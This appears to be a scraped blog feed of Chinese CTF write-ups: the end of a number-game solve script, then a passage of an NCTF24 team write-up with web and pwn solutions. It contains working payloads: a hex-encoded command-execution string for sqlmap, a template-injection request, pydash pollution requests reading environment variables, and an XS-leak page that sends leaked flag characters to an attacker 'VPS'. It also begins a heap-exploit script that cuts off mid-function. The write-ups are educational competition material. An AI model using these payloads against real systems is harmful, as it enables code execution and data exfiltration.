My Score<span class="token operator">:</span> <span class="token number">718</span>
Opponent Score<span class="token operator">:</span> <span class="token number">557</span>
Score Difference<span class="token operator">:</span> <span class="token number">161</span>

Level <span class="token number">100</span> <span class="token punctuation">(</span><span class="token number">0</span> moves<span class="token punctuation">)</span><span class="token operator">:</span>
choices <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span>
My Score<span class="token operator">:</span> <span class="token number">2856</span>
Opponent Score<span class="token operator">:</span> <span class="token number">2194</span>
Score Difference<span class="token operator">:</span> <span class="token number">662</span>

Level <span class="token number">200</span> <span class="token punctuation">(</span><span class="token number">0</span> moves<span class="token punctuation">)</span><span class="token operator">:</span>
choices <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">]</span>
My Score<span class="token operator">:</span> <span class="token number">11094</span>
Opponent Score<span class="token operator">:</span> <span class="token number">9006</span>
Score Difference<span class="token operator">:</span> <span class="token number">2088</span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>


context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"47.94.204.178"</span><span class="token punctuation">,</span><span class="token number">26629</span> <span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'3.Quit\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>

<span class="token comment"># 这边打的时候Level1使用的是之前手动取的值</span>
nums<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
      <span class="token punctuation">[</span><span class="token number">199</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">185</span><span class="token punctuation">,</span> <span class="token number">161</span><span class="token punctuation">,</span> <span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">183</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">175</span><span class="token punctuation">,</span> <span class="token number">133</span><span class="token punctuation">,</span> <span class="token number">159</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">153</span><span class="token punctuation">,</span> <span class="token number">194</span><span class="token punctuation">,</span> <span class="token number">141</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">129</span><span class="token punctuation">,</span> <span class="token number">172</span><span class="token punctuation">,</span> <span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">164</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">195</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">189</span><span class="token punctuation">,</span> <span class="token number">147</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span> <span class="token number">182</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">154</span><span class="token punctuation">,</span> <span class="token number">148</span><span class="token punctuation">,</span> <span class="token number">146</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">142</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">170</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">,</span> <span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">174</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">132</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> num <span class="token keyword">in</span> nums<span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ers\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> num<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'ber:'</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>b”Congratulations!, Here’s Your Flag flag{Greed, is……key of the life.}\n”</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>cry</tag>
        <tag>web</tag>
        <tag>re</tag>
        <tag>pwn</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF24 不知道 WP</title>
    <url>/2025/04/14/NCTF24-%E4%B8%8D%E7%9F%A5%E9%81%93-WP/</url>
    <content><![CDATA[<h1 id="战队名：不知道"><a href="#战队名：不知道" class="headerlink" title="战队名：不知道"></a>战队名：不知道</h1><p><strong>排名：6</strong></p>
<p>成员：LamentXU、Jerrythepro123、lianjin、Liv</p>
<h2 id=""><a href="#" class="headerlink" title=""></a><img src="/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png" loading="lazy"></h2><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>拉门特许超级无敌详细版：</p>
<blockquote>
<p><a href="https://www.cnblogs.com/LAMENTXU/articles/18799383">https://www.cnblogs.com/LAMENTXU/articles/18799383</a></p>
</blockquote>
<h3 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h3><p>签到题。</p>
<p>sqlmap有个–exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕</p>
<p>payload：</p>
<blockquote>
<p>127.0.0.1?id&#x3D;1 –eval&#x3D;exec(bytes.fromhex(‘5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729’))</p>
</blockquote>
<h3 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a>ez_dash</h3><p>我是第一个报告非预期的（大声）</p>
<p>根本不需要污染。bottle里&lt;%也可以执行，waf没禁完。</p>
<p>直接打abort回显。秒了。</p>
<blockquote>
<p>GET &#x2F;render?path&#x3D;&lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa&#x3D;getoutput(“env”)%0aabort(404,a)%20%&gt;</p>
</blockquote>
<h3 id="ez-dash-revenge"><a href="#ez-dash-revenge" class="headerlink" title="ez_dash_revenge"></a>ez_dash_revenge</h3><p>首先污染掉pydash的helpers.RESTRICTED_KEYS，不然拿不到__globals__</p>
<blockquote>
<p>POST &#x2F;setValue?name&#x3D;pydash HTTP&#x2F;1.1</p>
<p>{</p>
<p>“path”: “helpers.RESTRICTED_KEYS”,</p>
<p>“value”: “123”</p>
<p>}</p>
</blockquote>
<p>然后setval找globals找bottle。改templete的路径，加一个&#x2F;proc&#x2F;self</p>
<blockquote>
<p>POST &#x2F;setValue?name&#x3D;setval HTTP&#x2F;1.1</p>
<p>{</p>
<p>“path”: “<strong>globals</strong>.bottle.TEMPLATE_PATH”,</p>
<p>“value”: [“.&#x2F;“,”.&#x2F;views&#x2F;“,</p>
<pre><code>&quot;/proc/self/&quot;
</code></pre>
<p>]</p>
<p>}</p>
</blockquote>
<p>随后直接render?path&#x3D;environ即可</p>
<h3 id="internal-api"><a href="#internal-api" class="headerlink" title="internal_api"></a>internal_api</h3><p>XS_leak，通过请求码来泄露。</p>
<p>exp：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Error-Based Attack<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">let</span> currentFlag <span class="token operator">=</span> <span class="token string">"nctf&#123;"</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> chars <span class="token operator">=</span> <span class="token string">"abcdef0123456789-&#123;&#125;"</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token parameter">ms</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">checkCharacter</span><span class="token punctuation">(</span><span class="token parameter">char</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://0.0.0.0:8000/internal/search?s=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>currentFlag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>

                script<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                    document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

                script<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                    document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

                document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>currentFlag<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token keyword">const</span> isCorrect <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">checkCharacter</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>isCorrect<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                            currentFlag <span class="token operator">+=</span> char<span class="token punctuation">;</span>
                            window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://VPS:8000/?flag=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>currentFlag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">break</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://VPS:8000/?error=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>currentFlag<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>VPS起这个服务，bot访问即可</p>
<p><img src="/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png" loading="lazy"></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="unauth-diary"><a href="#unauth-diary" class="headerlink" title="unauth-diary"></a>unauth-diary</h3><p>先创造largebin来泄漏libc和堆地址，之后创造一个大小为-1的堆块，这样可以溢出来打tcache poisioning。用stdout结构体打house of apple来调用setcontext来写rop。rop用dup2来改输入输出的fd，这样就能拿到shell了。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
<span class="token comment">#io=process("")</span>
<span class="token comment">#io=remote("localhost",9999)</span>
io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"39.106.16.204"</span><span class="token punctuation">,</span> <span class="token number">33245</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> a <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span>    a<span class="token operator">=</span><span class="token boolean">False</span>        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token boolean">True</span>    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b        <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
shell <span class="token operator">=</span> <span class="token keyword">lambda</span>            <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>script<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>script<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

